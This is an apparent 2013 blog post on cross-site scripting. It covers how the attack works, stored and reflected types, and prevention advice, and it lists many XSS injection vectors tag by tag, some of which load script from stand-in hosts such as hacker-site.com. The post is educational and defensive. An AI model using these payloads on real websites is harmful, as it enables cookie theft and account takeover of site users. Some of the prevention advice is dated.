---
layout: post
title:  "Cross Site Scripting(XSS)"
date:   2013-06-18 13:59:40
categories: vulnerabilities
---

Cross Site Scripting (XSS) is the act of injecting malicious scripts or other HTML code into a web page that runs on the client browser and cause damage to your web site users. Mostly it works when your trust on a user input (e.g. feedback comments) and render such information as part of web page HTML without validating the contents thus all other users who visit this web page may become of attack.

Depending on the malicious script, it may execute automatically in web browser when the page is loading or it may trigger with a user action. Few web browsers like Internet Explorer put such infected web pages under suspected category and give warnings to user if any scripting code is being executed while web page is rendering but many Cross Site Script works by tricking with users and encouraging them to click on a link/image etc. that leads to malicious action without users being aware of such actions.

Simplest example to understand how it works: If you enter following JavaScript code in a Comment section of webpage, then next time whenever the page will load in browser it will execute the java script and prompt user with “hello” message:

<script>alert(hello);</script>
Injecting code with Img tag: <img src=javascript:alert(hello);>

Tricking users could be as simple as sending a interesting jpg (image) file to a user by email or putting a link in comment and embedding the malicious script into the jpg/image file. Many users does not see any risk with a image file but as soon as they click on the link from attacker’s source their security may be compromised.

Cross Site Scripting (XSS) Attack How it works?

If the attacker found a way to inject his script and he is capable to run his script in user’s browser then he may use this vulnerability to perform many actions like getting access to all other sensitive data (e.g. page contents, data & session cookies) available under current user session and he may pass such sensitive information to any other site without user being able to notice the attack or anything suspicious. Sometimes attacker does not get any direct benefit with the Cross Site Scripting (XSS) attack but it may help him to exploit other vulnerabilities.

Because Cross Site Scripting (XSS) attack impacts the website user base hence the influence of attack is very much dependent on the target user base of website. For example attacking a social website homepage may allow attacker to steal sensitive data from all the users who visit the website.

Cross Site Scripting (XSS) attack is also very harmful because the malicious html code runs in trusted zone, if user trust on your website contents and if your website also trust the authticated/anonymous user then both sides are acting in a trust environment thus allow max. potential to the attacker. While other attacks like SQL Injection attack can be monitored with monitoring tools and defendable with server side implementation, you are less capable of monitoring Cross Site Scripting (XSS) attack when the action is happening on client side.

Type of Cross Site Scripting (XSS) Attacks:

Cross Site Scripting (XSS) attacks are broadly categorized in two categories:

1) Persistent/Stored XSS:The persistent XSS is stored on the server side as part of infected webpage and it may impact all of the users who visit the webpage. It could be a trusted social website but the webpage is crafted by the attacker. You may find interesting stuff on attacker’s space but this webpage may contain malicious scripts or links.

2) Non-Persistent/Reflected XSS: Reflected attack is usually delivered by including a malicious link in a email. On top of it the link URL may appear pointing to a non-harmful/trusted website but containing the hidden XSS attack vector. When user clicks on the link, he may be redirected to the trusted site but the hidden XSS attack vector would execute malicious script and compromise the user data available with vulnerable website. Sometime the link may be pointing directly to a website compromised/hosted by the attacker, similar to above example of sending a interesting image/jpg file to the target user.

Impact:Cross Site Scripting allows an attacker to embed malicious JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable dynamic page to fool the user, executing the script on his machine in order to gather data. The use of XSS might compromise private information, manipulate or steal cookies, create requests that can be mistaken for those of a valid user, or execute malicious code on the end-user systems. The data is usually formatted as a hyperlink containing malicious content and which is distributed over any possible means on the internet.

How to Prevent:

Because Cross Site Scripting (XSS) attacks may be crafted and delivered to users in multiple ways, you would not only need to protect your website implementation but also have to secure user actions and the data stored on the user side mostly in Cookie.

Identify Vulnerable Areas: For server side protection you first need to identify all those interfaces that render HTML based in inputs provided by users .e.g. Comments or feedback on your posts. The input could be indirect, for example the registered user’s name or id that if displayed in your website to other users.

Validate & Encode/Escape User Inputs: Once you know what all areas in your website depends on dynamic/user inputs then put the validation code to check that data is not matching the attack pattern e.g. does not have Script tags. The attack patterns are not limited and it may not be possible for you to put right defense in place to identify all possible patterns. Using a Web Application Firewall may be a quick solution.
Whether you may validate user inputs or not, you must HTML encode user provided data. You may use OWASP Antisamy API, HtmlPurifier or other security tools available for safe encoding of malicious contents. If the webpage also use Query string/URL parameters for HTML rendering then also URLEncode such data.

The complexity may increase when you provide WYSWYG or rich text editors as part of your applications and want to allow users to format their inputs using HTML tags.

When using ASP.Net:

- turn on correct Character encoding by setting the requestEncoding & responseEncoding attributes to “ISO-8859-1? & “ISO-8859-1? respectively in Web.Config file under “globalization” section.

- ASP.Net also provides protection by auto validating user inputs and restricting use of Scripts. To turn on this protection set validateRequest attribute to “true” in your Web.config file.

- Use innerText instead of innerHTML when you dynamically set the HTML of any tag during server side code. For example showing the Logged in user’s name in a HTML object that is retrieved from database but actually this input is controlled by the user when creating his profile.

Secure data saved in Cookie: If you store any sensitive data with Cookie on client side that must be encrypted and always checked for valid pattern before trusting such data. It is a wide spread practice to create a session id for authenticated users, storing session id in a cookie and web applications solely relying on session cookie to validate if the user has already login and authentic. Any XSS attack with that attacker may steal session cookie, allow attackers to login as fake user and further compromise website or user data. Simply encrypting session id here does not help because the attacker would also pass a correctly encrypted session id. To mitigate this problem you may validate session Id against the user IP address and may ask for reauthentication if the IP address has changed.

You should also set the HttpOnly cookie attribute that restrict client-side scripts to access a Cookie property of document object on client side script.
Vulnerable HTML Tags

The following HTML tags are commonly used by attackers to inject script code that should be looked closely for content validation:

<img>
<link>
<frame>
<iframe>
<embed>
<meta>

Other dangerous tags:

<frameset>
	<applet>
	<object>
	<html>
	<body>
	<layer>
	<ilayer>

“script”, “style”, “src”, “href”, “lowsrc” are the attributes that are used to inject the malicious scripts.

The “style’ tag may be used to inject script by setting the “Type” attribute value as “text/JavaScript”.

<style TYPE=”text/javascript”>
alert(‘you are done!’);
</style>

<SCRIPT>

The <SCRIPT> tag is the most popular way and sometimes easiest to detect. It can arrive to your page in the following forms:

External script:

<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>

Embedded script:

<SCRIPT> alert(“XSS”); </SCRIPT>

<BODY>

The <BODY> tag can contain an embedded script by using the ONLOAD event, as shown below:

<BODY ONLOAD=alert("XSS")>

The BACKGROUND attribute can be similarly exploited:

<BODY BACKGROUND="javascript:alert('XSS')">

<IMG>

Some browsers will execute a script when found in the <IMG> tag as shown here:

<IMG SRC="javascript:alert('XSS');">

There are some variations of this that work in some browsers:

<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">

<IFRAME>

The <IFRAME> tag allows you to import HTML into a page. This important HTML can contain a script.

<IFRAME SRC=”http://hacker-site.com/xss.html”>

<INPUT>

If the TYPE attribute of the <INPUT> tag is set to “IMAGE”, it can be manipulated to embed a script:

<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

<LINK>

The <LINK> tag, which is often used to link to external style sheets could contain a script:

<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

<TABLE>

The BACKGROUND attribute of the TABLE tag can be exploited to refer to a script instead of an image:

<TABLE BACKGROUND="javascript:alert('XSS')">

The same applies to the <TD> tag, used to separate cells inside a table:

<TD BACKGROUND="javascript:alert('XSS')">

<DIV>

The <DIV> tag, similar to the <TABLE> and <TD> tags can also specify a background and therefore embed a script:

<DIV STYLE="background-image: url(javascript:alert('XSS'))">

The <DIV> STYLE attribute can also be manipulated in the following way:

<DIV STYLE="width: expression(alert('XSS'));">

<OBJECT>

The <OBJECT> tag can be used to pull in a script from an external site in the following way:

<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">

<EMBED>

If the hacker places a malicious script inside a flash file, it can be injected in the following way:

<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">

Example of a Cross Site Scripting Attack

As a simple example, imagine a search engine site which is open to an XSS attack. The query screen of the search engine is a simple single field form with a submit button. Whereas the results page, displays both the matched results and the text you are looking for.

Search Results for "XSS Vulnerability"

To be able to bookmark pages, search engines generally leave the entered variables in the URL address. In this case the URL would look like:

http://test.searchengine.com/search.php?q=XSS%20

Vulnerability

Next we try to send the following query to the search engine:

<script type="text/javascript">
	alert ('This is an XSS Vulnerability')
	</script>

By submitting the query to search.php, it is encoded and the resulting URL would be something like:

http://test.searchengine.com/search.php?q=%3Cscript%3Ealert%28%91This%20is%20an%20XSS%20Vulnerability%92%29%3C%2Fscript%3E

Upon loading the results page, the test search engine would probably display no results for the search but it will display a JavaScript alert which was injected into the page by using the XSS vulnerability.
